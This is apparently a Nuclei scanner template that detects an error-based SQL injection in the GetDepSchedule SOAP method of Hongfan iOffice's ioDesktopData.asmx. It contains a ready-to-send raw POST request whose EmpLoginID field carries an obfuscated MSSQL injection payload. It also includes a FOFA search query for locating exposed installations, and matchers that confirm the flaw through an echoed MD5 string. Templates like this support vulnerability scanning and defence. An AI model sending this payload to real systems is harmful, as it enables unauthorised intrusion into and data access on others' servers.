id: hongfan-iodesktopdata-sqli

info:
  name: 红帆 iOffice ioDesktopData.asmx SQL 注入
  author: zan8in
  severity: high
  description: |
    红帆 iOffice /iOffice/prg/set/wss/ioDesktopData.asmx 的 GetDepSchedule 接口 EmpLoginID 参数可报错注入，响应 500 且回显探测串 MD5。
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="红帆-ioffice"
  tags: hongfan,ioffice,sqli

variables:
  num: "{{rand_int(100000, 999999)}}"

http:
  - raw:
      - |
        POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8

        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
        <soap:Header/>
        <soap:Body>
        <tem:GetDepSchedule>
        <tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes('md5','{{num}}')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>
        </tem:GetDepSchedule>
        </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{md5(num)}}"
      - type: status
        status:
          - 500
